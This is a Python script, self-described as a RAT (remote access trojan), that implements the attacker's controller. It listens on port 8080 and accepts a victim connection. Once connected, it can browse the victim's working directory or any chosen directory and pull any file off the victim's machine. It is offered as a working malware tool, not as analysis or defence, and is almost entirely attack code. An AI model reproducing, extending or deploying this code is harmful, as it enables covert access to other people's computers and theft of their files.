import os
import socket

# RAT Made by Bruv#6969

s = socket.socket()
host=socket.gethostname()
port=8080
s.bind((host,port))
os.system("figlet -f slant 6ix9ine RAT |lolcat -a")
print("")
print("Server is currently running @ ", host)
print("")
print("Listening for any incoming connections")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " Has connected to the server successfully")

while 1:
    command = input(str("Cmd>"))
    if command == "help":
        command_name = "<<<CoMmAnDs FoR RaT>>>"
        os.system(f"echo {command_name} |lolcat")
        print("view_cwd\ncustom_dir\ndownload_file")

    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for the yes...")
        print("")
        print("Command executed yes yes")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)
        
    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Enter the directory : "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent yes yes")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Results : ", files)
    
    
    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("Please enter the file path including name : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Please enter name for file including the extention : "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, "Has been downloaded and saved!11!11")
        print("")



    else:
        print("Command no recognized")
        print("")